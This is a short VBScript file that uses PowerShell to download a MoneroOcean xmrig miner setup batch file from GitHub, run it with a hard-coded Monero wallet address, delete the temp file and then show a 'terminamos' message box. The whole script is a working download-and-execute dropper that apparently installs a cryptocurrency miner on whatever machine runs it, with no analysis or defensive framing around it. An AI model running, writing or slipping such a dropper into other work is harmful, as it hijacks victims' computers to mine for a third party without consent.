dim shell,cmd
set shell=createobject("wscript.shell")
cmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command "
shell.run cmd & "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile '84xuSDre31h3wxkFYcykqKh5tRjRT7rfgTzAJq2bsrSuWAAPVH6qLvH7DYvHCp3caLbqFFDAsAkatRiECnSco2XcHnrvucq'; Remove-Item -Force $tempfile"
msgbox "terminamos"
